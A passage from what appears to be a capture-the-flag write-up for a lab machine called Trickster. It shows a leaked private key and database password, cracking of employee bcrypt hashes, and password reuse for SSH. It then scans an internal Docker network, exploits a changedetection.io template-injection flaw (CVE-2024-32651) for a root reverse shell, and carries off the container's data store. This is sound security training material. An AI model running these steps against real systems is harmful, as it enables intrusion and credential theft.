QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY-----
',
    'api_private_key' => '-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
/C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
Geq6MswRO6OXfLs4Rzuw17S9nQ0PDi4OqsG6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
+Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
6SMIa53I2hJz4IMK4vc2Ssqq
-----END PRIVATE KEY-----
',
  ),
);

```

#### Database

I’ll connect to the DB using the creds from the config file:

```

www-data@trickster:~$ mysql -u ps_user -pprest@shop_o
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11516
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

There’s only one database non-default db available:

```

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

```

There are 276 tables:

```

MariaDB [(none)]> use prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> show tables;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+
| ps_access                                       |
| ps_accessory                                    |
| ps_address                                      |
| ps_address_format                               |
| ps_admin_filter                                 |
| ps_alias                                        |
| ps_api_access                                   |
| ps_attachment                                   |
| ps_attachment_lang                              |
| ps_attribute                                    |
| ps_attribute_group                              |
| ps_attribute_group_lang                         |
| ps_attribute_group_shop                         |
| ps_attribute_lang                               |
| ps_attribute_shop                               |
| ps_authorization_role                           |
| ps_authorized_application                       |
| ps_blockwishlist_statistics                     |
| ps_carrier                                      |
| ps_carrier_group                                |
| ps_carrier_lang                                 |
| ps_carrier_shop                                 |
| ps_carrier_tax_rules_group_shop                 |
| ps_carrier_zone                                 |
| ps_cart                                         |
| ps_cart_cart_rule                               |
| ps_cart_product                                 |
| ps_cart_rule                                    |
| ps_cart_rule_carrier                            |
| ps_cart_rule_combination                        |
| ps_cart_rule_country                            |
| ps_cart_rule_group                              |
| ps_cart_rule_lang                               |
| ps_cart_rule_product_rule                       |
| ps_cart_rule_product_rule_group                 |
| ps_cart_rule_product_rule_value                 |
| ps_cart_rule_shop                               |
| ps_category                                     |
| ps_category_group                               |
| ps_category_lang                                |
| ps_category_product                             |
| ps_category_shop                                |
| ps_cms                                          |
| ps_cms_category                                 |
| ps_cms_category_lang                            |
| ps_cms_category_shop                            |
| ps_cms_lang                                     |
| ps_cms_role                                     |
| ps_cms_role_lang                                |
| ps_cms_shop                                     |
| ps_configuration                                |
| ps_configuration_kpi                            |
| ps_configuration_kpi_lang                       |
| ps_configuration_lang                           |
| ps_connections                                  |
| ps_connections_page                             |
| ps_connections_source                           |
| ps_contact                                      |
| ps_contact_lang                                 |
| ps_contact_shop                                 |
| ps_country                                      |
| ps_country_lang                                 |
| ps_country_shop                                 |
| ps_currency                                     |
| ps_currency_lang                                |
| ps_currency_shop                                |
| ps_customer                                     |
| ps_customer_group                               |
| ps_customer_message                             |
| ps_customer_message_sync_imap                   |
| ps_customer_session                             |
| ps_customer_thread                              |
| ps_customization                                |
| ps_customization_field                          |
| ps_customization_field_lang                     |
| ps_customized_data                              |
| ps_date_range                                   |
| ps_delivery                                     |
| ps_emailsubscription                            |
| ps_employee                                     |
| ps_employee_session                             |
| ps_employee_shop                                |
| ps_feature                                      |
| ps_feature_flag                                 |
| ps_feature_lang                                 |
| ps_feature_product                              |
| ps_feature_shop                                 |
| ps_feature_value                                |
| ps_feature_value_lang                           |
| ps_ganalytics                                   |
| ps_ganalytics_data                              |
| ps_gender                                       |
| ps_gender_lang                                  |
| ps_group                                        |
| ps_group_lang                                   |
| ps_group_reduction                              |
| ps_group_shop                                   |
| ps_gsitemap_sitemap                             |
| ps_guest                                        |
| ps_homeslider                                   |
| ps_homeslider_slides                            |
| ps_homeslider_slides_lang                       |
| ps_hook                                         |
| ps_hook_alias                                   |
| ps_hook_module                                  |
| ps_hook_module_exceptions                       |
| ps_image                                        |
| ps_image_lang                                   |
| ps_image_shop                                   |
| ps_image_type                                   |
| ps_import_match                                 |
| ps_info                                         |
| ps_info_lang                                    |
| ps_info_shop                                    |
| ps_lang                                         |
| ps_lang_shop                                    |
| ps_layered_category                             |
| ps_layered_filter                               |
| ps_layered_filter_block                         |
| ps_layered_filter_shop                          |
| ps_layered_indexable_attribute_group            |
| ps_layered_indexable_attribute_group_lang_value |
| ps_layered_indexable_attribute_lang_value       |
| ps_layered_indexable_feature                    |
| ps_layered_indexable_feature_lang_value         |
| ps_layered_indexable_feature_value_lang_value   |
| ps_layered_price_index                          |
| ps_layered_product_attribute                    |
| ps_link_block                                   |
| ps_link_block_lang                              |
| ps_link_block_shop                              |
| ps_linksmenutop                                 |
| ps_linksmenutop_lang                            |
| ps_log                                          |
| ps_mail                                         |
| ps_mailalert_customer_oos                       |
| ps_manufacturer                                 |
| ps_manufacturer_lang                            |
| ps_manufacturer_shop                            |
| ps_memcached_servers                            |
| ps_message                                      |
| ps_message_readed                               |
| ps_meta                                         |
| ps_meta_lang                                    |
| ps_module                                       |
| ps_module_access                                |
| ps_module_carrier                               |
| ps_module_country                               |
| ps_module_currency                              |
| ps_module_group                                 |
| ps_module_history                               |
| ps_module_preference                            |
| ps_module_shop                                  |
| ps_operating_system                             |
| ps_order_carrier                                |
| ps_order_cart_rule                              |
| ps_order_detail                                 |
| ps_order_detail_tax                             |
| ps_order_history                                |
| ps_order_invoice                                |
| ps_order_invoice_payment                        |
| ps_order_invoice_tax                            |
| ps_order_message                                |
| ps_order_message_lang                           |
| ps_order_payment                                |
| ps_order_return                                 |
| ps_order_return_detail                          |
| ps_order_return_state                           |
| ps_order_return_state_lang                      |
| ps_order_slip                                   |
| ps_order_slip_detail                            |
| ps_order_state                                  |
| ps_order_state_lang                             |
| ps_orders                                       |
| ps_pack                                         |
| ps_page                                         |
| ps_page_type                                    |
| ps_page_viewed                                  |
| ps_pagenotfound                                 |
| ps_product                                      |
| ps_product_attachment                           |
| ps_product_attribute                            |
| ps_product_attribute_combination                |
| ps_product_attribute_image                      |
| ps_product_attribute_lang                       |
| ps_product_attribute_shop                       |
| ps_product_carrier                              |
| ps_product_comment                              |
| ps_product_comment_criterion                    |
| ps_product_comment_criterion_category           |
| ps_product_comment_criterion_lang               |
| ps_product_comment_criterion_product            |
| ps_product_comment_grade                        |
| ps_product_comment_report                       |
| ps_product_comment_usefulness                   |
| ps_product_country_tax                          |
| ps_product_download                             |
| ps_product_group_reduction_cache                |
| ps_product_lang                                 |
| ps_product_sale                                 |
| ps_product_shop                                 |
| ps_product_supplier                             |
| ps_product_tag                                  |
| ps_profile                                      |
| ps_profile_lang                                 |
| ps_psgdpr_consent                               |
| ps_psgdpr_consent_lang                          |
| ps_psgdpr_log                                   |
| ps_psreassurance                                |
| ps_psreassurance_lang                           |
| ps_quick_access                                 |
| ps_quick_access_lang                            |
| ps_range_price                                  |
| ps_range_weight                                 |
| ps_request_sql                                  |
| ps_required_field                               |
| ps_risk                                         |
| ps_risk_lang                                    |
| ps_search_engine                                |
| ps_search_index                                 |
| ps_search_word                                  |
| ps_shop                                         |
| ps_shop_group                                   |
| ps_shop_url                                     |
| ps_smarty_cache                                 |
| ps_smarty_last_flush                            |
| ps_smarty_lazy_cache                            |
| ps_specific_price                               |
| ps_specific_price_priority                      |
| ps_specific_price_rule                          |
| ps_specific_price_rule_condition                |
| ps_specific_price_rule_condition_group          |
| ps_state                                        |
| ps_statssearch                                  |
| ps_stock                                        |
| ps_stock_available                              |
| ps_stock_mvt                                    |
| ps_stock_mvt_reason                             |
| ps_stock_mvt_reason_lang                        |
| ps_store                                        |
| ps_store_lang                                   |
| ps_store_shop                                   |
| ps_supplier                                     |
| ps_supplier_lang                                |
| ps_supplier_shop                                |
| ps_supply_order                                 |
| ps_supply_order_detail                          |
| ps_supply_order_history                         |
| ps_supply_order_receipt_history                 |
| ps_supply_order_state                           |
| ps_supply_order_state_lang                      |
| ps_tab                                          |
| ps_tab_lang                                     |
| ps_tab_module_preference                        |
| ps_tag                                          |
| ps_tag_count                                    |
| ps_tax                                          |
| ps_tax_lang                                     |
| ps_tax_rule                                     |
| ps_tax_rules_group                              |
| ps_tax_rules_group_shop                         |
| ps_timezone                                     |
| ps_translation                                  |
| ps_warehouse                                    |
| ps_warehouse_carrier                            |
| ps_warehouse_product_location                   |
| ps_warehouse_shop                               |
| ps_web_browser                                  |
| ps_webservice_account                           |
| ps_webservice_account_shop                      |
| ps_webservice_permission                        |
| ps_wishlist                                     |
| ps_wishlist_product                             |
| ps_wishlist_product_cart                        |
| ps_zone                                         |
| ps_zone_shop                                    |
+-------------------------------------------------+
276 rows in set (0.002 sec)

```

There’s a `ps_customer` table with hashes, but that seems less likely to be useful here. `ps_employee` is a good place to start:

```

MariaDB [prestashop]> describe ps_employee;
+--------------------------+---------------------+------+-----+---------------------+----------------+
| Field                    | Type                | Null | Key | Default             | Extra          |
+--------------------------+---------------------+------+-----+---------------------+----------------+
| id_employee              | int(10) unsigned    | NO   | PRI | NULL                | auto_increment |
| id_profile               | int(10) unsigned    | NO   | MUL | NULL                |                |
| id_lang                  | int(10) unsigned    | NO   |     | 0                   |                |
| lastname                 | varchar(255)        | NO   |     | NULL                |                |
| firstname                | varchar(255)        | NO   |     | NULL                |                |
| email                    | varchar(255)        | NO   | MUL | NULL                |                |
| passwd                   | varchar(255)        | NO   |     | NULL                |                |
| last_passwd_gen          | timestamp           | NO   |     | current_timestamp() |                |
| stats_date_from          | date                | YES  |     | NULL                |                |
| stats_date_to            | date                | YES  |     | NULL                |                |
| stats_compare_from       | date                | YES  |     | NULL                |                |
| stats_compare_to         | date                | YES  |     | NULL                |                |
| stats_compare_option     | int(1) unsigned     | NO   |     | 1                   |                |
| preselect_date_range     | varchar(32)         | YES  |     | NULL                |                |
| bo_color                 | varchar(32)         | YES  |     | NULL                |                |
| bo_theme                 | varchar(32)         | YES  |     | NULL                |                |
| bo_css                   | varchar(64)         | YES  |     | NULL                |                |
| default_tab              | int(10) unsigned    | NO   |     | 0                   |                |
| bo_width                 | int(10) unsigned    | NO   |     | 0                   |                |
| bo_menu                  | tinyint(1)          | NO   |     | 1                   |                |
| active                   | tinyint(1) unsigned | NO   |     | 0                   |                |
| optin                    | tinyint(1) unsigned | YES  |     | NULL                |                |
| id_last_order            | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer_message | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer         | int(10) unsigned    | NO   |     | 0                   |                |
| last_connection_date     | date                | YES  |     | NULL                |                |
| reset_password_token     | varchar(40)         | YES  |     | NULL                |                |
| reset_password_validity  | datetime            | YES  |     | NULL                |                |
| has_enabled_gravatar     | tinyint(3) unsigned | NO   |     | 0                   |                |
+--------------------------+---------------------+------+-----+---------------------+----------------+
29 rows in set (0.001 sec)

```

There are two rows:

```

MariaDB [prestashop]> select firstname,lastname,email,passwd,active from ps_employee;
+-----------+----------+---------------------+--------------------------------------------------------------+--------+
| firstname | lastname | email               | passwd                                                       | active |
+-----------+----------+---------------------+--------------------------------------------------------------+--------+
| Trickster | Store    | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |      1 |
| james     | james    | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |      0 |
+-----------+----------+---------------------+--------------------------------------------------------------+--------+
2 rows in set (0.000 sec)

```

### su / SSH

#### Hashcat

I’ll format these two into a file with the user name and hash:

```

admin@trickster.htb:$2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
james@trickster.htb:$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm

```

Running `hashcat` in detect mode asks for a specific mode:

```

$ hashcat employees.hashes --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

```

There’s no reason to think it’s anything besides generic bycrypt, so I’ll run again with `-m 3200`:

```

$ hashcat employees.hashes --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
hashcat (v6.2.6) starting
...[snip]...
Hashes: 2 digests; 2 unique digests, 2 unique salts
...[snip]...
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
...[snip]...

```

The james user password cracks as “alwaysandforever” pretty quickly.

#### Shell

That password works for james on trickster with `su`:

```

www-data@trickster:~$ su - james
Password: 
james@trickster:~$

```

And SSH:

```

oxdf@hacky$ sshpass -p 'alwaysandforever' ssh james@trickster.htb
james@trickster:~$

```

I’ll grab `user.txt`:

```

james@trickster:~$ cat user.txt
62088608************************

```

## Shell as root in Container

### Enumeration

#### Home Directory

james’ home directory is very empty:

```

james@trickster:~$ ls -la
total 36
drwxr-x--- 5 james james 4096 Sep 13 12:24 .
drwxr-xr-x 5 root  root  4096 Sep 13 12:24 ..
lrwxrwxrwx 1 root  root     9 Sep 13 11:54 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 james james 3771 Jan  6  2022 .bashrc
drwx------ 2 james james 4096 Sep 13 12:24 .cache
drwxrwxr-x 3 james james 4096 Sep 13 12:24 .local
-rw-r--r-- 1 james james  807 Jan  6  2022 .profile
drwx------ 2 james james 4096 Sep 13 12:24 .ssh
-rw-r----- 1 root  james   33 May 24 20:54 user.txt

```

#### Processes

The processes are mostly not that interesting:

```

james@trickster:~$ pstree
systemd─┬─ModemManager───2*[{ModemManager}]
        ├─VGAuthService
        ├─agetty
        ├─apache2───2*[apache2───26*[{apache2}]]
        ├─auditd─┬─laurel
        │        └─2*[{auditd}]
        ├─containerd───8*[{containerd}]
        ├─containerd-shim─┬─python───28*[{python}]
        │                 └─10*[{containerd-shim}]
        ├─cron
        ├─dbus-daemon
        ├─dhclient───3*[{dhclient}]
        ├─dockerd───10*[{dockerd}]
        ├─fwupd───4*[{fwupd}]
        ├─irqbalance───{irqbalance}
        ├─mariadbd───19*[{mariadbd}]
        ├─multipathd───6*[{multipathd}]
        ├─networkd-dispat
        ├─php-fpm8.1─┬─php-fpm8.1───sh───sh───script───sh───bash───su───bash
        │            └─3*[php-fpm8.1]
        ├─polkitd───2*[{polkitd}]
        ├─python3───chromedriver
        ├─rsyslogd───3*[{rsyslogd}]
        ├─snapd───9*[{snapd}]
        ├─sshd───sshd───sshd───bash───pstree
        ├─systemd───(sd-pam)
        ├─systemd-journal
        ├─systemd-logind
        ├─systemd-network
        ├─systemd-resolve
        ├─systemd-timesyn───{systemd-timesyn}
        ├─systemd-udevd
        ├─udisksd───4*[{udisksd}]
        ├─upowerd───2*[{upowerd}]
        └─vmtoolsd───3*[{vmtoolsd}]

```

`pstree` shows my reverse shell as www-data is coming from `php-fpm`, as well as my SSH session running `pstree`.

The only other thing that jumps out is `containerd` with `python` child processes. Looking a bit closes, that python process is PID 76231:

```

james@trickster:~$ ps auxww | grep 76231
root       76231  0.4  1.8 1300332 74136 ?       Ssl  23:40   0:02 python ./changedetection.py -d /datastore

```

There’s a container running here. The `changedetection.py` script is referencing `/datastore`, which is likely in the container, not the host.

#### Network

The host does have a `docker0` interface as 172.17.0.1:

```

james@trickster:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:68:1c:61:73  txqueuelen 0  (Ethernet)
        RX packets 249  bytes 14356 (14.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 45  bytes 1890 (1.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.34  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:79:6d  txqueuelen 1000  (Ethernet)
        RX packets 17204  bytes 8950677 (8.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25961  bytes 2101945 (2.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2048798  bytes 3310619789 (3.3 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2048798  bytes 3310619789 (3.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth42298fc: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether aa:89:ee:60:8a:e5  txqueuelen 0  (Ethernet)
        RX packets 5  bytes 354 (354.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 42 (42.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

I would suspect other containers to be on that same class C (172.17.0.0/24). A ping sweep finds 172.17.0.2:

```

james@trickster:~$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.094 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.074 ms

```

A quick port scan with `nc` finds port 5000 open:

```

james@trickster:~$ for port in {1..65535}; do echo > /dev/tcp/172.17.0.2/$port && echo "$port open"; done 2>/dev/null           
5000 open

```

#### Change Detection

From the host, I’ll check out post 5000 on this container:

```

james@trickster:~$ curl 172.17.0.2:5000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=/">/login?next=/</a>. If not, click the link.

```

The `title` on `/login` shows it’s named “Change Detection”:

```

james@trickster:~$ curl 172.17.0.2:5000/login -s | head
<!DOCTYPE html>
<html lang="en" data-darkmode="false">

  <head>
    <meta charset="utf-8" >
    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
    <meta name="description" content="Self hosted website change detection." >
    <title>Change Detection</title>
    <link rel="alternate" type="application/rss+xml" title="Changedetection.io » Feed" href="/rss?tag=&amp;token=" >
    <link rel="stylesheet" href="/static/styles/pure-min.css" >

```

I’ll reconnect SSH using `-L 5000:172.17.0.2:5000` to tunnel localhost:5000 through to this website. The site is an instance of [ChangeDetection.io](https://changedetection.io/):

![image-20240924202229822](/img/image-20240924202229822.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The version at the top right is 0.45.20. The password for james, “alwaysandforever”, works to log in:

![image-20240924203221614](/img/image-20240924203221614.png)

### CVE-2024-32651

#### Background

Searching for “changedetection.io 0.45.20 exploit” returns multiple references to CVE-2024-32651:

![image-20240924203432766](/img/image-20240924203432766.png)

[CVE-2024-32651](https://nvd.nist.gov/vuln/detail/CVE-2024-32651) is a:

> Server Side Template Injection (SSTI) in Jinja2 that allows Remote Command Execution on the server host. Attackers can run any system command without any restriction and they could use a reverse shell. The impact is critical as the attacker can completely takeover the server machine. This can be reduced if changedetection is behind a login page, but this isn’t required by the application (not by default and not enforced).

This [advisory](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3) has steps for a POC.

#### POC

I’ll create a new watch for my host with a name “0xdf”. On the “Notifications” tab, under “Notifcation Body”, I’ll add the SSTI payload:

![image-20240924210038647](/img/image-20240924210038647.png)

Above that is the “Notifications URL List”. There are a bunch of different URL types like Discord and Telegram, but as the HTB machine can’t reach the internet, they won’t work. Another option is `get://`, which will send a GET request. Interestingly, it still sends the payload in the HTTP body. I’ll start `nc` on 80 and give it `get://10.10.14.6:80`. I’ll click “Send test notification”:

![image-20240924210251551](/img/image-20240924210251551.png)

At `nc`:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.34 47036
GET / HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 38

uid=0(root) gid=0(root) groups=0(root)

```

The body is the result of the common run on the system!

#### Shell

Annoyingly, on sending a test notification, the site sends me back to another tab, and the “Notifications” tab is empty on returning. I’ll just go to Burp and replay the same request in Repeater. I’ll change `id` to a [Bash Reverse Shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20240924210605118](/img/image-20240924210605118.png)

On sending, I get a shell as root in the container:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.34 50648
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ae5c137aa8ef:/app# 

```

I’ll upgrade my shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

root@ae5c137aa8ef:/app# script /dev/null -c bash
Script started, output log file is '/dev/null'. 
root@ae5c137aa8ef:/app# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset 
reset: unknown terminal type unknown
Terminal type? screen
root@ae5c137aa8ef:/app#

```

## Shell as admin\_admin992

### mknod Fail

Now that I have a low priv shell on the host and a root shell in a container, it is worth checking for the `mknod` exploit I showed as an [unintended solution for Intuition](/2024/09/14/htb-intuition.html#host-raw-disk-access). If I try to make a node, it doesn’t work. That’s because while the `mknod` capabilities is enabled by default, this container has it explicitly disabled:

```

root@ae5c137aa8ef:/app# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: HYBRID (4)

```

`!cap_mknod` means no `mknod`.

### Enumeration

The app is running out of `/app`:

```

root@ae5c137aa8ef:/app# ls
changedetection.py  changedetectionio
root@ae5c137aa8ef:/app# ls changedetectionio/
__init__.py       importer.py                      source.txt
__pycache__       model                            static
api               notification.py                  store.py
apprise_asset.py  processors                       strtobool.py
blueprint         pytest.ini                       tag.txt
content_fetchers  queuedWatchMetaData.py           templates
diff.py           run_basic_tests.sh               tests
flask_app.py      run_custom_browser_url_tests.sh  update_worker.py
forms.py          run_proxy_tests.sh
html_tools.py     run_socks_proxy_tests.sh

```

Data that might typically be stored in a database is actually in `/datastore`:

```

root@ae5c137aa8ef:/datastore# ls
957d3247-d603-45c4-bb00-c8eb384842cf  secret.txt
Backups                               url-list-with-tags.txt
b86f1003-3ecb-4125-b090-27e15ca605b9  url-list.txt
bbdd78f6-db98-45eb-9e7b-681a0c60ea34  url-watches.json

```

The GUID folders can be empty or can contain `.txt.br` files:

```

root@ae5c137aa8ef:/datastore# ls b86f1003-3ecb-4125-b090-27e15ca605b9/                                          
3855b43e05c02a09c0b63be14f70a8bb.txt.br  ce6278706b3912f01bf5355004eb538a.txt.br  d589415eb5dbd392fa8874829ce30450.txt.br  history.txt
7fa5d9292139604c79d87fb69f21ffe2.txt.br  cf0c62552e4672c2326c0ef0489883c8.txt.br  dd25d6c8b666e21ac6e596faa4d4a93d.txt.br

```

These files are binary, compressed with [Brotli](https://brotli.org/).

### Datastore

#### Exfil

I’ll package the entire `/datastore` directory into an archive. There’s no `zip` in the container, but `tar` works:

```

root@ae5c137aa8ef:/# zip datastore.zip -r datastore/
bash: zip: command not found
root@ae5c137aa8ef:/# tar czf datastore.tar.gz datastore/

```

There’s a bunch of ways to get this back to my VM. There’s no `nc`, so I’ll just `base64 datastore.tar.gz -w0` and then copy the results and paste into a file on my host. Then:

```

oxdf@hacky$ base64 -d datastore.tar.gz.b64 > datastore.tar.gz
oxdf@hacky$ file datastore.tar.gz
datastore.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 235520
oxdf@hacky$ tar xzf datastore.tar.gz
oxdf@hacky$ ls datastore
957d3247-d603-45c4-bb00-c8eb384842cf  b86f1003-3ecb-4125-b090-27e15ca605b9  Backups  bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt  url-list.txt  url-list-with-tags.txt  url-watches.json

```

#### Structure

The `url-watches.json` file has detailed information about the various watches. The `.txt` file has just lists of URLs:

```

oxdf@hacky$ cat url-list.txt 
https://news.ycombinator.com/
https://changedetection.io/CHANGELOG.txt
oxdf@hacky$ cat url-list-with-tags.txt 
https://news.ycombinator.com/ ['81d1365d-4ceb-4609-88d6-22afcd84d5bd']
https://changedetection.io/CHANGELOG.txt ['3b1f652a-68f8-4540-9c97-4a95ec6a131b']

```

The ‘tag’ corresponds with the directories with `.txt.rb` files. The `brotli` command (`sudo apt install brotli`) will decompress them:

```

oxdf@hacky$ brotli -d b86f1003-3ecb-4125-b090-27e15ca605b9/3855b43e05c02a09c0b63be14f70a8bb.txt.br
